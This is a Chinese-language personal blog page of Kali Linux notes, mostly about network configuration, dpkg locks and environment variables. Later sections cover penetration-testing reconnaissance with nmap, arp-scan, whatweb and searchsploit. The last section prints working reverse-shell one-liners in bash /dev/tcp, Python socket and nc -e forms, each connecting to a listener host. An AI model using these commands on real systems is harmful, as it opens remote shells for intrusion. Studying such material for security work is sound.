<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        Kali-usage - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>主页</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>标签</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>存档</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>关于</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>搜索</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kali-linux-使用备忘"><span class="toc-text">Kali linux 使用备忘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#网络无法连接"><span class="toc-text">网络无法连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无法获得锁"><span class="toc-text">无法获得锁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment-variables"><span class="toc-text">Environment variables</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Persistent-Environment-Variables"><span class="toc-text">Persistent Environment Variables</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bin"><span class="toc-text">/bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#扫描"><span class="toc-text">扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#主机发现"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口扫描"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#指纹识别"><span class="toc-text">指纹识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#搜索脚本"><span class="toc-text">搜索脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反弹shell"><span class="toc-text">反弹shell</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">搜索</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        Kali-usage
    </div>

    <div class="post-meta">
        <span class="attr">发布于：<span>2020-04-29 13:40:34</span></span>
        
        <span class="attr">标签：/
        
        <a class="tag" href="/tags/#linux" title="linux">linux</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <h1 id="Kali-linux-使用备忘"><a href="#Kali-linux-使用备忘" class="headerlink" title="Kali linux 使用备忘"></a>Kali linux 使用备忘</h1><h2 id="网络无法连接"><a href="#网络无法连接" class="headerlink" title="网络无法连接"></a>网络无法连接</h2><ol>
<li><p>ifconfig 只有 Local</p>
<p>先检查一下 DNS 有没有忘记配置</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/resolv.conf</span><br><span class="line">   nameserver 8.8.8.8 or your dns server</span><br></pre></td></tr></table></figure>

</li>
</ol>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line">检查一下 eth0 网卡</span><br><span class="line">   </span><br><span class="line">   ifconfig eth0 up</span><br><span class="line">vi /etc/network/interfaces</span><br><span class="line">   iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line">  <span class="built_in"> service </span>networking restart</span><br></pre></td></tr></table></figure>

<h2 id="无法获得锁"><a href="#无法获得锁" class="headerlink" title="无法获得锁"></a>无法获得锁</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E: 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)</span><br><span class="line">E: 无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？</span><br></pre></td></tr></table></figure>

<p>只要</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /var/cache/apt/archives/lock </span><br><span class="line">sudo rm /var/lib/dpkg/lock</span><br></pre></td></tr></table></figure>

<h2 id="Environment-variables"><a href="#Environment-variables" class="headerlink" title="Environment variables"></a>Environment variables</h2><p>可以分为两大类：enviroment variables and shell variables</p>
<p><strong>Enviroment varialbes</strong> : 可以在整个系统范围内使用，并且被所有衍生的子进程和 shells 所继承。</p>
<p><strong>Shell varialbes</strong> : 只能被用于当前的 shell 。就像 zsh 和 bash ，每个 shell 都有自己的内部变量集。</p>
<p>下面这些命令允许你列出来 enviroment vraiables 并且可以配置。</p>
<ul>
<li><code>env</code> – The command allows you to run another program in a  custom environment without modifying the current one. When used without  an argument it will print a list of the current environment variables.</li>
<li><code>printenv</code> – The command prints all or the specified environment variables.</li>
<li><code>set</code> – The command sets or unsets shell variables. When used without an argument it will print a list of all variables including  environment and shell variables, and shell functions.</li>
<li><code>unset</code> – The command deletes shell and environment variables.</li>
<li><code>export</code> – The command sets environment variables.</li>
</ul>
<h3 id="Persistent-Environment-Variables"><a href="#Persistent-Environment-Variables" class="headerlink" title="Persistent Environment Variables"></a>Persistent Environment Variables</h3><p>为了环境变量能持久(?) 我们需要到 bash 配置文件中定义一下。在大多数 Linux 发行版里我们需要重启一个会话。环境变量从下面几个文件里读取：</p>
<ul>
<li><p><code>/etc/environment</code> - Use this file to set up system-wide environment variables. Variables in this file are set in the following format:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FOO=bar</span><br><span class="line">VAR_TEST=<span class="string">"Test Var"</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><code>/etc/profile</code> - Variables set in this file are loaded  whenever a bash login shell is entered. When declaring environment  variables in this file you need to use the <code>export</code> command:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=<span class="string">"/path/to/java/home"</span></span><br><span class="line">export PATH=<span class="variable">$PATH:</span><span class="variable">$JAVA_HOME</span>/bin</span><br></pre></td></tr></table></figure>
</li>
<li><p>Per-user shell specific configuration files. For example, if you are using Bash, you can declare the variables in the <code>~/.bashrc</code>:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=<span class="string">"<span class="variable">$HOME</span>/bin:<span class="variable">$PATH</span>"</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>To load the new environment variables into the current shell session use the <a href="https://linuxize.com/post/bash-source-command/" target="_blank" rel="noopener"><code>source</code></a> command:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure>

<h2 id="bin"><a href="#bin" class="headerlink" title="/bin"></a>/bin</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/bin      是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、<span class="built_in">kill</span>、ls、mkdir、more、mount、rm、su、tar等。    </span><br><span class="line">/sbin     一般是指超级用户指令。主要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。   </span><br><span class="line">/usr/bin　是你在后期安装的一些软件的运行脚本。主要放置一些应用软体工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。</span><br><span class="line">/usr/sbin 放置一些用户安装的系统管理的必备程式例如:dhcpd、httpd、imap、<span class="keyword">in</span>.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。    </span><br><span class="line">如果新装的系统，运行一些很正常的诸如：shutdown，fdisk的命令时，悍然提示：bash:<span class="built_in">command</span> not found。那么首先就要考虑root 的<span class="variable">$PATH</span>里是否已经包含了这些环境变量。    </span><br><span class="line">可以查看PATH，如果是：PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin则需要添加成如下：PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin:/sbin:/usr/bin:/usr/sbin</span><br></pre></td></tr></table></figure>

<p>在 Kali 中我们可以看到 /bin/sh 是一个静态链接，链接到 <code>dash</code> ,而 <code>dash</code> 与 <code>bash</code> 一样，作为系统 <code>shell</code> 使用。</p>
<p>查看当前使用 shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll `which sh`</span><br></pre></td></tr></table></figure>

<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line">nmap -sn 192.168.0.0/24</span><br></pre></td></tr></table></figure>

<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A 192.168.0.105</span><br></pre></td></tr></table></figure>

<h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb url</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="搜索脚本"><a href="#搜索脚本" class="headerlink" title="搜索脚本"></a>搜索脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit druopl 7</span><br></pre></td></tr></table></figure>

<p>如果是 py 文件，可以直接根据提供的路径运行</p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>python</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&apos;192.168.0.4&apos;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;]);</span><br></pre></td></tr></table></figure>

<p>nc 反向连接，前提是目标机器有nc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.0.4 7777</span><br></pre></td></tr></table></figure>

<p>nc 安装</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1、下载安装</span><br><span class="line">wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/download</span><br><span class="line">tar -zxvf netcat-0.7.1.tar.gz -C /usr/local</span><br><span class="line">cd /usr/local</span><br><span class="line">mv netcat-0.7.1 netcat</span><br><span class="line">cd /usr/local/netcat</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">2、配置</span><br><span class="line">vim /etc/profile</span><br><span class="line">添加以下内容：</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span>  netcat path</span></span><br><span class="line">export NETCAT_HOME=/usr/local/netcat</span><br><span class="line">export PATH=$PATH:$NETCAT_HOME/bin</span><br><span class="line">保存，退出，并使配置生效：</span><br><span class="line">source /etc/profile</span><br><span class="line">3、测试</span><br><span class="line">nc -help成功</span><br></pre></td></tr></table></figure>


        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "./public/search.xml"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
